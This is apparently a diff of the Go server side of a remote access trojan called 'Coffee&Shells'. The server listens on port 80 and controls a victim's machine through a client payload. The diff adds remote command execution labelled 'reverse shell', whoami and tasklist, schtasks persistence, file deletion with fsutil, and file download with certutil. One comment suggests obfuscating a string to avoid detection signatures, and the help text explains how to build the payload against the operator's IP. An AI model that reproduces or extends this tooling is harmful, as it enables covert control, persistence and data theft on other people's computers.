@@ -4,8 +4,9 @@ import("net")
 import("bufio")
 import("strings")
 import("time")
+import("os")
 func main () {
-	fmt.Print("Waiting for client to connect...\n")
+	fmt.Print("Waiting for client to connect...\n") // make connection
 	file := "h-server-file"
 	option := "h-server-options"
 	connection, errer := net.Listen("tcp", ":80")
@@ -18,21 +19,43 @@ func main () {
 		fmt.Print("\nError when accepting connection\nexiting...")
 		return
 	}
-	fmt.Print("Connection made!\n")
-	for {
-		fmt.Print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nOptions:\n0. Help\n1. Exit Server\n2. Exit Server And Client\n3. Read File\n4. List Files\n5. LOLBas module (Maintain access, file delete, file download, and traffic capture): ")
+	fmt.Print("Connection made!\n") // end make connection
+	for { // for loop that breaks when server exists
+		fmt.Print("\n\nOptions:\n0. Help\n1. Exit Server\n2. Exit Server And Client\n3. Read File\n4. List Files\n5. LOLBas module (Maintain access, file delete, and file upload)\n6. Whoami\n7. Tasklist (warning: executes tasklist.exe)\n8. Execute command: ")
 		fmt.Scanln(&option)
-		if (option == "5") {
-			fmt.Print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n0. Go back\n1. maintain access via schtasks\n2. Delete file via fsutil\n3. File download via Bitsadmin: ")
+		if (option == "8") { // reverse shell
+			fmt.Fprintf(connectwo, "a\n")
+			fmt.Print("Command: ")
+			scanner := bufio.NewScanner(os.Stdin)
+			scanner.Scan()
+			cmd := scanner.Text()
+			fmt.Fprintf(connectwo, cmd + "\n")
+			out,_ := bufio.NewReader(connectwo).ReadString('\n')
+			out = strings.Replace(out, "COMMANDSAREFUN", "\n", -1)
+			fmt.Print(out)
+		}
+		if (option == "7") { // tasklist
+			fmt.Fprintf(connectwo, "9\n")
+			out,_ := bufio.NewReader(connectwo).ReadString('\n')
+			out = strings.Replace(out, "74211553", "\n", -1) // this may become a signature, obf if needed
+			fmt.Print(out)
+		}
+		if (option == "6") { //whoami
+			fmt.Fprintf(connectwo, "8\n")
+			out,_ := bufio.NewReader(connectwo).ReadString('\n')
+			fmt.Print(out)
+		}
+		if (option == "5") { //LOLBas 
+			fmt.Print("\n\nWarning: these all execute cmd.exe\n0. Go back\n1. maintain access via schtasks\n2. Delete file via fsutil\n3. File download via certutil: ")
 			choice := "02"
 			fmt.Scanln(&choice)
-			if (choice == "1") {
+			if (choice == "1") { //schtasks maintain access
 				fmt.Fprintf(connectwo, "5\n")
 				fmt.Print("Command sent\nOutput:")
 				out,_ := bufio.NewReader(connectwo).ReadString('\n')
 				fmt.Print(out)
 			}
-			if (choice == "2") {
+			if (choice == "2") { // delete file fsutil
 				fmt.Print("File to delete: ")
 				choicer := "string"
 				fmt.Scanln(&choicer)
@@ -42,7 +65,7 @@ func main () {
 				out,_ := bufio.NewReader(connectwo).ReadString('\n')
 				fmt.Print(out)
 			}
-			if (choice == "3") {
+			if (choice == "3") { // file download certutil
 				fmt.Print("File URL: ")
 				choicer := "string"
 				fmt.Scanln(&choicer)
@@ -58,18 +81,25 @@ func main () {
 				fmt.Print("Command sent\n",out)
 			}
 		}
-		if (option == "0") {
+		if (option == "0") { // help
 			fmt.Print("Made by Coffee&Shells\nHow to make a client/payload: open the h.go file, change the IP to yours, if you change the port you'll also have to change the port on the server. Build the file, and you now have your payload.\nHow to fix most bugs: exit the server, the client will not exit, and re-open the server\n")
 		}
-		if (option == "1") {
+		if (option == "1") { // exit server 
 			return
 		}
-		if (option == "2") {
-			fmt.Fprintf(connectwo, "3\n")
-			fmt.Print("Run server again to make sure client has exited")
-			return
+		if (option == "2") { // exit client and server
+			fmt.Print("Are you sure? Y/N: ")
+			choice := ""
+			fmt.Scanln(&choice)
+			if (choice == "Y") {
+				fmt.Fprintf(connectwo, "3\n")
+				fmt.Print("Run server again to make sure client has exited")
+				return
+			} else {
+				fmt.Print("Exit canceled...\n")
+			}
 		}
-		if (option == "4") {
+		if (option == "4") { // ls/dir
 			fmt.Fprintf(connectwo, "4\n")
 			fmt.Print("Dir to read: ")
 			aaa := "/"
@@ -91,7 +121,7 @@ func main () {
 				fmt.Print(stuff2)
 			}
 		}
-		if (option == "3") {
+		if (option == "3") { //cat
 			fmt.Fprintf(connectwo, "1\n")
 			fmt.Print("File to read: ")
 			fmt.Scanln(&file)
